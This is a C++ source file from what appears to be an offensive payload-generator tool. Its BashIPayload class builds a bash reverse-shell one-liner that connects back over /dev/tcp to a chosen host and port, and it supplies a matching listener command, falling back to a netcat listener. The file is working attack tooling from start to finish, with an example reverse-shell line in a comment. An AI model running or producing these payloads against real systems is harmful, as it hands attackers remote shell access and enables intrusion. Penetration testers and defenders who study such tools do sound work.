#include "Bash_I_Payload.h"
#include "../../listeners/ListenerFactory.h"
#include "../../core/Options.h"

#include <memory>
#include <string>

// Returns the logical name for this payload type, used in UIs or CLI flags
std::string BashIPayload::name() const { return "shell"; }

// Generates a reverse-shell command invoking a chosen interpreter (bash, sh,
// zsh, etc.)
std::string BashIPayload::generate(const Options &o) const {
  //  Choose interpreter, default to "bash" if none specified"
  std::string sh = o.interpreter.empty() ? "bash" : o.interpreter;

  // Build the reverse-shell one-liner
  // e.g. "sh -i >& /dev/tcp/1.2.3.4/4444 0>&1"
  return sh + " -i >& /dev/tcp/" + o.host + "/" + std::to_string(o.port) + " 0>&1";
}

// Uses the ListenerFactory to get the appropriate listener based on Options
std::string BashIPayload::listener(const Options &o) const {
  ListenerFactory listenerFactory;
  IListener *listener = listenerFactory.get(o.listenerType);

  if (!listener) {
    // Fallback to netcat if the requested listener isn't found
    return "nc -lvnp " + std::to_string(o.port);
  }

  return listener->command(o);
}
